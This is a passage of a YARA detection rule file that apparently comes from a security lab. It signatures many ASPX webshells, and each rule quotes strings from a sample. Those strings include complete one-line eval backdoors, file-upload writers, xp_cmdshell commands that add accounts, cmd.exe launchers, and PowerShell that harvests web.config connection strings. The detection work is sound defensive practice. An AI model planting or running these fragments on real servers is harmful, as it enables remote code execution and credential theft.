        $s16 = "<asp:DropDownList id=\"seldbname\" runat=\"server\" CssClass=\"input\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"sel" fullword ascii
        $s17 = "if (Session[\"login\"] == null || Session[\"login\"].ToString().Length < 1)" fullword ascii
        $s18 = "DataTable editData = RunTable(\"select * from \" + Request.QueryString[\"tblname\"].ToString() + \" where \" +" fullword ascii
        $s19 = ".head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
        $s20 = "Response.Redirect(Request.ServerVariables[\"HTTP_REFERER\"] + \"\", true);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ba42e36cfa4e2303f7ff7ec7d076fa4b11f468ec
{
    meta:
        description = "aspx - file ba42e36cfa4e2303f7ff7ec7d076fa4b11f468ec.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6029d38f0057c792705ccce544ae3ed16804306bbaa8975a54a87dec34bd9ed3"
    strings:
        $s1 = "<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[\"f\"])  ); }%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_60d131af1ed23810dbc78f85ee32ffd863f8f0f4
{
    meta:
        description = "aspx - file 60d131af1ed23810dbc78f85ee32ffd863f8f0f4.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d9cd2bcd2a5449836a5c6b4f8e6e486f2f391f92e8db7fad044ab7d16438f4a2"
    strings:
        $s1 = "this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+pack" fullword ascii
        $s2 = "this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thread i" fullword ascii
        $s3 = "<a href=\"http://hi.baidu.com/linx2008/blog/item/7020f1de1b1c805395ee3768.html\">2</a> " fullword ascii
        $s4 = "<a href=\" http://hi.baidu.com/cnqing/blog/item/92d8b35008ad871f377abee4.html\">1</a> " fullword ascii
        $s5 = "logfile = Server.MapPath(\"w\" + System.DateTime.Now.ToFileTime() + \".txt\");" fullword ascii
        $s6 = "if (stoptime.Year == (System.DateTime.Now.Year - 8))" fullword ascii
        $s7 = "if (this.txtlogfile.Text == \"\" || txtpackets.Text.Length < 1 || txtport.Text == \"\") return;" fullword ascii
        $s8 = "proException += \"<br>last time stop at \" + System.DateTime.Now.ToString();" fullword ascii
        $s9 = "<asp:TextBox ID=\"txtlogfile\" runat=\"server\"   width=\"90%\" Text=\"log.log\" ></asp:TextBox>" fullword ascii
        $s10 = "System.DateTime nextDay = System.DateTime.Now.AddDays(1);" fullword ascii
        $s11 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
        $s12 = "mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);" fullword ascii
        $s13 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
        $s14 = "static DateTime stoptime = System.DateTime.Now.AddYears(-8);" fullword ascii
        $s15 = "<asp:CheckBox ID=\"s_http_post\" runat=\"server\" />" fullword ascii
        $s16 = "<asp:TextBox ID=\"txtport\" Text=\"0\"  width=\"90%\" runat=\"server\"></asp:TextBox>" fullword ascii
        $s17 = "if (!logIt && my_s_http_post)" fullword ascii
        $s18 = "mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);" fullword ascii
        $s19 = "<%@ Import Namespace=\"System.Net.NetworkInformation\" %>" fullword ascii
        $s20 = "<td ><asp:DropDownList ID=\"ddlist\" runat=\"server\" width=\"90%\"></asp:DropDownList></td>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule ffed8514cb2afd92ee0f9477d2017b562ec51f0f
{
    meta:
        description = "aspx - file ffed8514cb2afd92ee0f9477d2017b562ec51f0f.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5de7fdd6c08f6b8a45f2cb67a20e826b8b260e03f49a770c5f8859aa67810507"
    strings:
        $s1 = "WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y(\"add6bb58e139be10\");" fullword ascii
    condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_954116d397a392beb8ab82e7c6960bba56e85b5f
{
    meta:
        description = "aspx - file 954116d397a392beb8ab82e7c6960bba56e85b5f.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ec982aceb8d49708b2f30e002cdd87839fb0d4d417951d014a3ee17dfe847364"
    strings:
        $s1 = "%><%eval(Request.Item[\"maskshell\"]," fullword ascii
        $s2 = "WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y(\"add6bb58e139be10\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_30f96715a8a361a348072df8e6e3bb1ca07355f3
{
    meta:
        description = "aspx - file 30f96715a8a361a348072df8e6e3bb1ca07355f3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "04cbd25c3d6c9afb504fb50a0f44c3ee2693d2a79538cfe5fffe5f724329605a"
    strings:
        $s1 = "<%@Page Language=JS%><%eval(Request.Item(0),\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c3bc4ab8076ef184c526eb7f16e08d41b4cec97e
{
    meta:
        description = "aspx - file c3bc4ab8076ef184c526eb7f16e08d41b4cec97e.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ac297be1bc6d2147d5220775da20bd422f8453abb3e288eea12f40a62e4f3343"
    strings:
        $s1 = "this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+pack" fullword ascii
        $s2 = "this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thread i" fullword ascii
        $s3 = "<a href=\"http://hi.baidu.com/linx2008/blog/item/7020f1de1b1c805395ee3768.html\">2</a> " fullword ascii
        $s4 = "<a href=\" http://hi.baidu.com/cnqing/blog/item/92d8b35008ad871f377abee4.html\">1</a> " fullword ascii
        $s5 = "logfile = Server.MapPath(\"w\" + System.DateTime.Now.ToFileTime() + \".txt\");" fullword ascii
        $s6 = "if (stoptime.Year == (System.DateTime.Now.Year - 8))" fullword ascii
        $s7 = "if (this.txtlogfile.Text == \"\" || txtpackets.Text.Length < 1 || txtport.Text == \"\") return;" fullword ascii
        $s8 = "proException += \"<br>last time stop at \" + System.DateTime.Now.ToString();" fullword ascii
        $s9 = "<asp:TextBox ID=\"txtlogfile\" runat=\"server\"   width=\"90%\" Text=\"log.log\" ></asp:TextBox>" fullword ascii
        $s10 = "System.DateTime nextDay = System.DateTime.Now.AddDays(1);" fullword ascii
        $s11 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
        $s12 = "mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);" fullword ascii
        $s13 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
        $s14 = "static DateTime stoptime = System.DateTime.Now.AddYears(-8);" fullword ascii
        $s15 = "<asp:CheckBox ID=\"s_http_post\" runat=\"server\" />" fullword ascii
        $s16 = "<asp:TextBox ID=\"txtport\" Text=\"0\"  width=\"90%\" runat=\"server\"></asp:TextBox>" fullword ascii
        $s17 = "if (!logIt && my_s_http_post)" fullword ascii
        $s18 = "mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);" fullword ascii
        $s19 = "<%@ Import Namespace=\"System.Net.NetworkInformation\" %>" fullword ascii
        $s20 = "<td ><asp:DropDownList ID=\"ddlist\" runat=\"server\" width=\"90%\"></asp:DropDownList></td>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule sig_543b1760d424aa694de61e6eb6b3b959dee746c2
{
    meta:
        description = "aspx - file 543b1760d424aa694de61e6eb6b3b959dee746c2.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e177b10b6508f4f80cdfc5db5efee2594f29661889869b7759fd7de6b3b809ac"
    strings:
        $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"Bin_List_Exec\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"Bin_List_Select" ascii
        $x2 = "SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><a" ascii
        $x3 = "Bin_ExecSql(\"EXEC master..xp_cmdshell 'echo \" + substrfrm + \" >> c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x4 = "ias\\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create" ascii
        $x5 = "<a href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $x6 = "ePath.Value + \"\\\" -T -f c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x7 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
        $x8 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WebShell Ver: <%=Version%></a></span" fullword ascii
        $x9 = "t:16px\" size=\"40\" value=\"c:\\windows\\system32\\sethc.exe\"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat=\"server\" " fullword ascii
        $x10 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_Sav" fullword ascii
        $x11 = "Bin_ExecSql(\"EXECUTE master..xp_cmdshell 'del c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x12 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8)" fullword ascii
        $x13 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8));" fullword ascii
        $x14 = "<asp:LinkButton ID=\"Bin_Button_Logout\" runat=\"server\" OnClick=\"Bin_Button_Logout_Click\" Text=\"Logout\" ></asp:LinkButton>" ascii
        $x15 = "foreach(ManagementObject p in Bin_WmiQuery(\"root\\\\CIMV2\",\"Select * from Win32_Process Where ProcessID ='\"+pid+\"'\"))" fullword ascii
        $x16 = "into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:" fullword ascii
        $x17 = "if(Bin_ExecSql(\"exec master..xp_makecab '\" + tmppath + \"\\\\~098611.tmp','default',1,'\" + Bin_TextBox_Source.Value + \"" fullword ascii
        $x18 = "return string.Format(\"<a href=\\\"javascript:Bin_PostBack('zcg_KillProcess','{0}')\\\">Kill</a>\",pid);" fullword ascii
        $s19 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
        $s20 = "<td style=\"width:20%\" align=\"left\">Target : <input id=\"Bin_TextBox_Target\" class=\"input\" runat=\"server\" type=\"text\" " ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_025347b68b4bf19dca2bad266132a5971f4c201a
{
    meta:
        description = "aspx - file 025347b68b4bf19dca2bad266132a5971f4c201a.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "48ab098fdf2df49cb79880d67daea425ce49166fb29535ff6c0ad3751fe77877"
    strings:
        $x1 = "//http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html" fullword ascii
        $x2 = "output.Text = @\"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in m" fullword ascii
        $x3 = "output.Text = @\"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in mind" fullword ascii
        $x4 = "1. Paste the script in command textbox and click 'Encode and Execute'. A reasonably large script could be executed using this." fullword ascii
        $x5 = "Executing PowerShell scripts on the target - " fullword ascii
        $x6 = "2. Use powershell one-liner (example below) for download & execute in the command box." fullword ascii
        $s7 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" fullword ascii
        $s8 = "Response.AppendHeader(\"Content-Disposition\", \"attachment; filename=\" + console.Text);" fullword ascii
        $s9 = "<asp:Button ID=\"encode\" runat=\"server\" Text=\"Encode and Execute\" OnClick=\"base64encode\" />" fullword ascii
        $s10 = "output.Text = @\"Welcome to Antak - A Webshell in Powershell" fullword ascii
        $s11 = "while using commands (like changing current directory or running session aware scripts). " fullword ascii
        $s12 = "output.Text = \"Upload status: The file could not be uploaded. The following error occured: \" + ex.Message;" fullword ascii
        $s13 = "string command = \"Invoke-Expression $(New-Object IO.StreamReader (\" +" fullword ascii
        $s14 = "To upload a file you must mention the actual path on server (with write permissions) in command textbox. " fullword ascii
        $s15 = "To download a file enter the actual path on the server in command textbox." fullword ascii
        $s16 = "//This section based on cmdasp webshell by http://michaeldaw.org" fullword ascii
        $s17 = "<asp:Button ID=\"downloadbutton\" runat=\"server\" Text=\"Download\" OnClick=\"downloadbutton_Click\" />" fullword ascii
        $s18 = "3. By uploading the script to the target and executing it." fullword ascii
        $s19 = "(OS temporary directory like C:\\Windows\\Temp may be writable.)" fullword ascii
        $s20 = "http://www.labofapenetrationtester.com/2014/06/introducing-antak.html" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f234da0c4512645863e0e3716035ea736a2559cb
{
    meta:
        description = "aspx - file f234da0c4512645863e0e3716035ea736a2559cb.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3ad78222bb9a03688e4ffcec36c2455ffad0abaef0b10d3fde819fdf1c8aeaaa"
    strings:
        $s1 = "*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]" fullword ascii /* hex encoded string '%' */
        $s2 = "< %@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/" fullword ascii
    condition:
        ( uint16(0) == 0x203c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_2607882493f7c22ca0a0a5076d953a6f892ad11b
{
    meta:
        description = "aspx - file 2607882493f7c22ca0a0a5076d953a6f892ad11b.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9e9bcb9e2592626d80592d5308ce34cf06fb4a110d02bba16810580ba1c0c3dc"
    strings:
        $x1 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
        $x2 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $s3 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
        $s4 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s6 = "an_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s7 = "<title>ASPXspy</title>" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule ab6e4445d2c4ec8a37a89eb83139b853f9068fe8
{
    meta:
        description = "aspx - file ab6e4445d2c4ec8a37a89eb83139b853f9068fe8.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0b98620cb8ac21af5712f4e88ed6f42791eb35f48d2ed56b86b32ced845c68d1"
    strings:
        $x1 = "Copyright &copy; 2009 Bin -- <a href=\"http://aspmuma.net\" target=\"_blank\">aspmuma.net</a>" fullword ascii
        $s2 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete xxooxx?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s3 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">aspmuma.net Ver: 2009</a></span><span " ascii
        $s4 = "Response.Redirect(\"http://www.baidu.com\");" fullword ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">aspmuma.net Ver: 2009</a></span><span " ascii
        $s6 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";" fullword ascii
        $s7 = "n_Span_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s8 = "Uoc+=ahAE.StandardError.ReadToEnd();" fullword ascii
        $s9 = "<form id=\"xxooxx\" runat=\"server\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule d8a4b7e911bc8d2611caeea3183acede65a9eeb7
{
    meta:
        description = "aspx - file d8a4b7e911bc8d2611caeea3183acede65a9eeb7.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5f959f480a66a33d37d9a0ef6c8f7d0059625ca2a8ae9236b49b194733622655"
    strings:
        $x1 = "<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->" fullword ascii
        $s2 = "psi.FileName = \"cmd.exe\";" fullword ascii
        $s3 = "psi.UseShellExecute = false;" fullword ascii
        $s4 = "<form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii
        $s5 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii
        $s6 = "<!--    http://michaeldaw.org   04/2007    -->" fullword ascii
        $s7 = "Process p = Process.Start(psi);" fullword ascii
        $s8 = "Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));" fullword ascii
        $s9 = "void cmdExe_Click(object sender, System.EventArgs e)" fullword ascii
        $s10 = "<title>awen asp.net webshell</title>" fullword ascii
        $s11 = "<asp:Label id=\"lblText\" style=\"Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat=\"server\">Command:</asp:Labe" ascii
        $s12 = "<script Language=\"c#\" runat=\"server\">" fullword ascii
        $s13 = "psi.RedirectStandardOutput = true;" fullword ascii
        $s14 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii
        $s15 = "<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a9fb7e58fc2008830c8a785bf532288895dc79b7
{
    meta:
        description = "aspx - file a9fb7e58fc2008830c8a785bf532288895dc79b7.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554"
    strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & cmd_to_execute & \" > \" & tempFile, 0, True)" fullword ascii
        $x2 = "errReturn = WinExec(Target_copy_of_cmd + \" /c \" + command + \"  > \" + tempFile , 10)" fullword ascii
        $x3 = "<p> Execute command with ASP.NET account using WSH(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $x4 = "<p> Execute command with ASP.NET account using W32(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $x5 = "objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)" fullword ascii
        $x6 = "<p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $x7 = "'local_copy_of_cmd= \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"" fullword ascii
        $x8 = "Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)" fullword ascii
        $x9 = "Dim kProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
        $x10 = "<p> Execute command with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
        $x11 = "Declare Function WinExec Lib \"kernel32\" Alias \"WinExec\" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long" fullword ascii
        $x12 = "Target_copy_of_cmd = Environment.GetEnvironmentVariable(\"Temp\")+\"\\kiss.exe\"" fullword ascii
        $x13 = "Function ExecuteCommand2(cmd_to_execute, tempFile)" fullword ascii
        $s14 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
        $s15 = "ExecuteCommand1(command,tempFile,txtCmdFile.Text)" fullword ascii
        $s16 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
        $s17 = "&nbsp;&nbsp; &nbsp; --- &nbsp;End Ip : &nbsp;<asp:TextBox ID=\"txtEndIP\" runat=\"server\" Width=\"185px\">127.0.0.1</asp:Text" fullword ascii
        $s18 = "kProcessStartInfo.UseShellExecute = False" fullword ascii
        $s19 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
        $s20 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_5c02ed5239b3ea3cd39c3a68989e0e56b494e3d2
{
    meta:
        description = "aspx - file 5c02ed5239b3ea3cd39c3a68989e0e56b494e3d2.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d021fe49123e4fa60cba1e9a907e751a627d5860bcaf92a0f49dbda788900c48"
    strings:
        $s1 = "WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y(\"add6bb58e139be10\");" fullword ascii
    condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule b9b13c2dedaee8af2364ba1dd11c0fb0b27b4c36
{
    meta:
        description = "aspx - file b9b13c2dedaee8af2364ba1dd11c0fb0b27b4c36.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dec56fb972444d9ad17cd70f52c944fd45729703ca2356f57e07822230bd3ce2"
    strings:
        $x1 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"{ $tempdir = (Get-Date).Ticks; new-item $env:temp\\$tempdir -Ite" fullword ascii
        $x2 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Fil" fullword ascii
        $x3 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($file in (get-childitem $path -Filter web.config -Recu" fullword ascii
        $x4 = "<asp:TextBox id=\"xpath\" width=\"350\" runat=\"server\">c:\\windows\\system32\\cmd.exe</asp:TextBox><br><br>" fullword ascii
        $x5 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd);\"" fullword ascii
        $x6 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-conten" fullword ascii
        $x7 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"remove-item $env:temp\\$tempdir -recurse;} \"" fullword ascii
        $x8 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.cip" fullword ascii
        $x9 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Filt" ascii
        $x10 = "myProcessStartInfo.Arguments=\" /c powershell -C \"\"$ErrorActionPreference = 'SilentlyContinue';\" " fullword ascii
        $x11 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.con" fullword ascii
        $x12 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $" ascii
        $x13 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$ds=New-Object system.Data.DataSet;\"" fullword ascii
        $x14 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Try { $connstrings = $xml.get_DocumentElement(); } Catch { cont" fullword ascii
        $x15 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"{ $tempdir = (Get-Date).Ticks; new-item $env:temp\\$tempdir -ItemT" ascii
        $x16 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$cmd = new-object System.Data.SqlClient.SqlCommand(\"\"\"\"\"\"\"+" ascii
        $x17 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$cmd = new-object System.Data.SqlClient.SqlCommand(\"\"\"\"\"\"\"+" ascii
        $x18 = "myProcessStartInfo.Arguments=\" /c powershell -C \"\"$conn=new-object System.Data.SqlClient.SQLConnection(\"\"\"\"\"\"\" + conn." ascii
        $x19 = "myProcessStartInfo.Arguments=\" /c powershell -C \"\"$conn=new-object System.Data.SqlClient.SQLConnection(\"\"\"\"\"\"\" + conn." ascii
        $s20 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($file in (get-childitem $path -Filter web.config -Recurse" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule e16decf084c100475a042d5517b69bbc0bd2776c
{
    meta:
        description = "aspx - file e16decf084c100475a042d5517b69bbc0bd2776c.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "74ebf0533b4c78ee51833c80fdffff97794ead91a0ae2c60ebb92b8093ea51fa"
    strings:
        $s1 = "dim mywrite as new streamwriter(request.form(\"path\"), true, encoding.default) mywrite.write(request.form(\"content\")) " fullword ascii
        $s2 = "<form action=http://127.0.0.1/test.aspx method=post>" fullword ascii
        $s3 = "<%@ Page Language=\"Jscript\"%><%Response.Write(eval(Request.Item[\"z\"],\"unsafe\"));%>" fullword ascii
        $s4 = "var nonamed=new System.IO.StreamWriter(Server.MapPath(\"nonamed.aspx\"),false);" fullword ascii
        $s5 = "<textarea name=l cols=120 rows=10 width=45>your code</textarea><BR><center><br>" fullword ascii
        $s6 = "<TITLE> ASPX one line Code Client by amxku</TITLE>" fullword ascii
        $s7 = "nonamed.Write(Request.Item[\"l\"]);" fullword ascii
    condition:
        ( uint16(0) == 0x6b31 and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule c020474333a556141f3d2dcd5219205dc1d92a47
{
    meta:
        description = "aspx - file c020474333a556141f3d2dcd5219205dc1d92a47.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0d7264685681068f69112a17d5be95a2b6e52709b47421295183e492879bb26f"
    strings:
        $s1 = "ms.ExecuteStatement(\"ev\"&\"al(request(\"\"8090sec\"\"))\")" fullword ascii
        $s2 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(eval(Request.Item[\"w\"],\"unsafe\"));%>" fullword ascii
        $s3 = "set ms = server.CreateObject(\"MSScriptControl.ScriptControl.1\")" fullword ascii
        $s4 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"" fullword ascii
        $s5 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"g\"],\"unsafe\");%>" fullword ascii
        $s6 = "/***************************************************************************************/  " fullword ascii
        $s7 = "\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u\"+\"e\"/*-/*-*/+\"s\"+\"t\"+            " fullword ascii
        $s8 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %>" fullword ascii
        $s9 = "/*-------------------------------------------------------------------------*/ " fullword ascii
        $s10 = "WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y(\"add6bb58e139be10\");" fullword ascii
